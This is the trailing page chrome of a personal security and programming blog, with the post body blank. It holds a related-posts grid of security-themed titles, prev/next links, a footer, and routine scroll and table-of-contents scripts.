    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  



<section class="related-topics mt5 mb4">
  <div class="bt b--black-10 pt4">
    <h3 class="f4 fw6 mb3">Related Posts</h3>

    <div class="related-posts-grid">
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/" class="link">
            <div class="related-post-title">Googles XSS Game - Solutions</div>
            <div class="related-post-date">02 Jun 2014</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">web</span>
                
                  <span class="tag-badge">wargames</span>
                
                  <span class="tag-badge">security</span>
                
              </div>
            
          </a>
        </div>
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2015/07/01/debugging-android-native-shared-libraries/" class="link">
            <div class="related-post-title">Debugging Android native shared libraries</div>
            <div class="related-post-date">01 Jul 2015</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">ipython</span>
                
                  <span class="tag-badge">hacking</span>
                
                  <span class="tag-badge">security</span>
                
              </div>
            
          </a>
        </div>
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/" class="link">
            <div class="related-post-title">usd AG Hacker challenge 2015 - Solutions</div>
            <div class="related-post-date">18 Mar 2015</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">android</span>
                
                  <span class="tag-badge">hacking</span>
                
                  <span class="tag-badge">networking</span>
                
              </div>
            
          </a>
        </div>
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox/" class="link">
            <div class="related-post-title">Android Dynamic Code Analysis - Mastering DroidBox</div>
            <div class="related-post-date">05 Aug 2014</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">android</span>
                
                  <span class="tag-badge">hacking</span>
                
                  <span class="tag-badge">networking</span>
                
              </div>
            
          </a>
        </div>
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis/" class="link">
            <div class="related-post-title">Disect Android APKs like a Pro - Static code analysis</div>
            <div class="related-post-date">07 Jul 2014</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">android</span>
                
                  <span class="tag-badge">hacking</span>
                
                  <span class="tag-badge">networking</span>
                
              </div>
            
          </a>
        </div>
      
        <div class="related-post-card">
          <a href="https://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump/" class="link">
            <div class="related-post-title">24h Android sniffing using tcpdump</div>
            <div class="related-post-date">23 Jan 2014</div>
            
              <div class="related-post-tags">
                
                  <span class="tag-badge">android</span>
                
                  <span class="tag-badge">hacking</span>
                
                  <span class="tag-badge">networking</span>
                
              </div>
            
          </a>
        </div>
      
    </div>

    <div class="tc mt4">
      <a href="https://blog.dornea.nu/tags" class="f6 link dim br-pill ph3 pv2 mb2 dib white bg-main-color">Browse All Tags</a>
    </div>
  </div>
</section>


  
  <div id="comments">
      

  </div>
</main>
 






<div class="tl fixed list-pages lh-copy" id="contents-list"></div>



<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
  
<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
<br>
  <p class="mb0 mt2">
  <a href="https://blog.dornea.nu/2013/05/03/overthewire-vortex-level1/">prev</a>
  <a href="https://blog.dornea.nu/2013/05/17/introducing-links-of-the-week-low-1/">next</a>
  </p>
</div>

  <footer class="content-width mt5 mb4 center ph3 gray f6">
  
  <div class="bt b--black-10 pv3"></div>
  
  
  <div class="cf">
    
    <div class="fl w-100 w-50-l pr4-l">
      <p class="mb2 fw6">About this blog</p>
      <p class="mv0 lh-copy">
        Personal thoughts on programming, productivity, and philosophy. I write about things I'm learning and ideas I find interesting.
      </p>
      <p class="mt3 o-70">
        © 2025 Victor Dorneanu
      </p>
    </div>
    
    
    <div class="fl w-100 w-50-l pl4-l mt4 mt0-l">
      <div class="cf">
        
        <div class="fl w-33">
          <p class="mb2 fw6">Navigation</p>
          <ul class="list pl0">
            <li class="pv1"><a href='https://blog.dornea.nu/' title="Home" class="link gray dim">Home</a></li>
            <li class="pv1"><a href='http://dornea.nu' title="About" class="link gray dim">About</a></li>
            <li class="pv1"><a href='https://blog.dornea.nu/tags' title="Tags" class="link gray dim">Tags</a></li>
            <li class="pv1"><a href='https://brainfck.org' title="Zettelkasten" class="link gray dim">Zettelkasten</a></li>
          </ul>
        </div>
        
        
        <div class="fl w-33">
          <p class="mb2 fw6">Connect</p>
          <ul class="list pl0">
            <li class="pv1">
              <a href='https://blog.dornea.nu/feed.xml' title="RSS" class="link gray dim">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="v-mid mr1"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg>
                RSS Feed
              </a>
            </li>
            <li class="pv1">
              <a href='https://github.com/dorneanu' title="GitHub" class="link gray dim">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="v-mid mr1"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
                GitHub
              </a>
            </li>
            <li class="pv1">
              <a href='https://www.goodreads.com/user/show/121423977-victor-dorneanu' title="Goodreads" class="link gray dim">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="v-mid mr1"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
                Goodreads
              </a>
            </li>
          </ul>
        </div>

        
        <div class="fl w-33">
          <p class="mb2 fw6">Support</p>
          <div class="pv1">
            <a href="https://www.buymeacoffee.com/dorneanu" target="_blank" class="dib">
              <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 40px;">
            </a>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  
  <div class="tc mt4 pt3 f7 o-70">
    Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme.
  </div>
</footer>
  



<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<style>.is-active-link::before { background-color: var(--secondary-color); }</style>




<script type="text/javascript">
var prevScrollpos = window.pageYOffset;
window.onscroll = function() {
  var currentScrollPos = window.pageYOffset;

  
  if (document.getElementById("tag-cloud") !== null) { 
    if (prevScrollpos > currentScrollPos) { 
      document.getElementById("tag-cloud").style.visibility = "visible";
      document.getElementById("tag-cloud").style.opacity = "1";
    } else {
      document.getElementById("tag-cloud").style.visibility = "hidden";
      document.getElementById("tag-cloud").style.opacity = "0";
    }
  }
  

  
  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
      document.getElementById("scroll-to-top").style.display = "inline";
      document.getElementById("scroll-to-top").style.visibility = "visible";
      document.getElementById("scroll-to-top").style.opacity = "1";
  } else {
      document.getElementById("scroll-to-top").style.visibility = "hidden";
      document.getElementById("scroll-to-top").style.opacity = "0";
  }
  
  prevScrollpos = currentScrollPos;
}


function topFunction() {
  document.body.scrollTop = 0; 
  document.documentElement.scrollTop = 0; 
}






if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
  tocbot.init({
    
    tocSelector: '#contents-list',
    
    contentSelector: '.post-content',
    
    headingSelector: 'h1, h2, h3',
  });
}


</script>





<script>
 var glightbox = GLightbox({
     selector: '.glightbox'
 });
</script>

  
</body>
</html>
